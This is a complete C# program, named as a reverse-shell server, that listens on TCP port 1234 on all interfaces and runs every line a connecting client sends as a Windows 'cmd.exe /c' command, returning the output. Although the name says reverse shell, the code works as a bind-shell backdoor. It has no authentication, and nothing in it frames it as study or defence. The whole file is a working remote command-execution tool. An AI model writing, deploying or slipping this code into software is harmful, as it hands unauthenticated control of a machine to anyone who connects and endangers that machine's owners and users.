using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellServer
{
    class Program
    {
        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 1234);
            listener.Start();
            Console.WriteLine("[+] Waiting for a connection...");

            TcpClient client = listener.AcceptTcpClient();
            Console.WriteLine("[+] Client connected!");

            NetworkStream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            writer.AutoFlush = true;

            while (true)
            {
                string command = reader.ReadLine();
                if (command == "exit")
                    break;

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/c " + command;
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                process.StartInfo = startInfo;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                writer.WriteLine(output);
            }

            client.Close();
            listener.Stop();
        }
    }
}
